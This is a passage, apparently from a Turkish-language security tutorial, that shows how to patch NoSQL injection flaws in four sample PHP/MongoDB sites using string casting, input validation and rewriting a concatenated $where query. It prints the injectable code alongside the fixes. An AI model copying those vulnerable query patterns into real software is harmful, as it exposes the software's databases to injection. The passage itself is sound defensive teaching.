Bu yöntem tek başına **NoSQL injection** saldırısının çalışmasını engeller; ancak, **ileri düzeyde güvenlik** ve **hata önleme** açısından **`email`** formatının doğru olup olmadığını doğrulamak da iyi bir fikir olacaktır.

`PHP`'de bunu aşağıdaki gibi yapabilirsiniz:

```php
...
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    // Invalid email
    ...
}
// Valid email
...
```

#### MangoPost

**Back end** tarafında, **`MangoPost`** biraz farklı görünüyor; ancak yine aynı problem ve aynı çözüm geçerli.

```php
...
if ($_SERVER['REQUEST_METHOD'] === "POST") {
    $json = json_decode(file_get_contents('php://input'));

    $manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
    $query = new MongoDB\Driver\Query(array("trackingNum" => $json->trackingNum));
    $cursor = $manager->executeQuery('mangopost.tracking', $query);
    $res = $cursor->toArray();
    
    if (count($res) > 0) {
        echo "Recipient:          " . $res[0]->recipient . "\n";
        echo "Address:            " . $res[0]->destination . "\n";
        echo "Mailed on:          " . $res[0]->mailedOn . "\n";
        echo "Estimated Delivery: " . $res[0]->eta;
    } else {
        echo "This tracking number does not exist";
    }

    die();
}
...
```

Bir **string** olarak **cast** et!

```php
...
$query = new MongoDB\Driver\Query(array("trackingNum" => strval($json->trackingNum)));
...
```

**Tracking number**'ların büyük ihtimalle belirli bir **format**ı vardır, bu yüzden bu **cast** işleminin yanı sıra, bunu da doğrulamamız gerekir. **Tracking number**'ların büyük/küçük harfler, rakamlar ve süslü parantezler içerebileceğini varsayalım (`/^[a-z0-9\{\}]+$/i`). Bunun için bir **RegEx** oluşturup **tracking number**'ları şu şekilde doğrulayabiliriz:

```php
...
if (!preg_match('/^[a-z0-9\{\}]+$/i', $trackingNum)) {
    // Invalid tracking number
    ...
}
// Valid tracking number
...
```


### Input Validation olmadan String Casting

#### MangoSearch

`MangoSearch`'teki sorun da aynıdır - **query** parametresi `$_GET['q']` herhangi bir **sanitization** işlemi uygulanmadan **query** dizisine aktarılmaktadır, bu da **NoSQL injection** saldırısına yol açmaktadır.

```php
...
if (isset($_GET['q']) && !empty($_GET['q'])):
    $manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
    $query = new MongoDB\Driver\Query(array("name" => $_GET['q']));
    $cursor = $manager->executeQuery('mangosearch.types', $query);
    $res = $cursor->toArray();
    foreach ($res as $type) {
        ...
```

Tıpkı `MangoMail`'de olduğu gibi, **`name`** değerinin bir **`string`** olması beklenir, bu yüzden **NoSQLi** açığını önlemek için `$_GET['q']` değerini bir **string** olarak **cast** edebiliriz.

```php
...
$query = new MongoDB\Driver\Query(array("name" => strval($_GET['q'])));
...
```


### Query Rewriting

#### MangoOnline

Önceki üç örneğin aksine, **MangoOnline** durumunda yalnızca **string** olarak **cast** etmek işe yaramayacaktır, çünkü **exploit** herhangi bir **array** içermiyordu. Kısa bir hatırlatma olarak, **back end** kodu şu şekilde görünüyor:

```php
if ($_SERVER['REQUEST_METHOD'] === "POST") {
    $q = array('$where' => 'this.username === "' . $_POST['username'] . '" && this.password === "' . md5($_POST['password']) . '"');

    $manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
    $query = new MongoDB\Driver\Query($q);
    $cursor = $manager->executeQuery('mangoonline.users', $query);
    $res = $cursor->toArray();
    if (count($res) > 0) {
        ...
```

Bu durumda en iyi seçenek, **MongoDB** sorgusunu **JavaScript** değerlendirmeyen bir sorguya dönüştürmek ve yeni **vulnerabilities** (güvenlik açıkları) eklememektir. Bu durumda işlem oldukça basittir:

```php
if ($_SERVER['REQUEST_METHOD'] === "POST") {
    $manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
    $query = new MongoDB\Driver\Query(array('username' => strval($_POST['username']), 'password' => md5($_POST['password'])));
...
```

**MongoDB** [geliştiricilerine](https://www.mongodb.com/docs/manual/reference/operator/query/where/) göre, bir sorguyu başka bir şekilde ifade etmek imkansızsa yalnızca `$where` kullanmalısınız.

Eğer projede **JavaScript** değerlendiren herhangi bir sorgu kullanmıyorsanız, varsayılan olarak etkin olan **server-side JavaScript değerlendirmesini** tamamen devre [dışı bırakmak](https://www.mongodb.com/docs/manual/core/server-side-javascript/#std-label-disable-server-side-js) iyi bir fikir olacaktır.


Bu adımlar, dört savunmasız web sitesini **NoSQL injection** saldırılarına karşı yamanmıştır. Geleneksel **SQL** veritabanları, **injection**'ı önlemek için mükemmel bir yöntem olan parametreli sorgulara sahiptir, ancak **MongoDB / NoSQL injection**'ı önlemek o kadar basit değildir. Bir geliştirici olarak yapabileceğiniz en iyi şeyler şunlardır:

- **Raw user input'u** kullanmaktan kaçının. Her zaman **sanitization** yapın, örneğin kabul edilebilir değerlerin **whitelist** ile.
- Mümkün olduğunca **JavaScript ifadelerinden** kaçının. Çoğu sorgu, regular query operator'leri ile yazılabilir.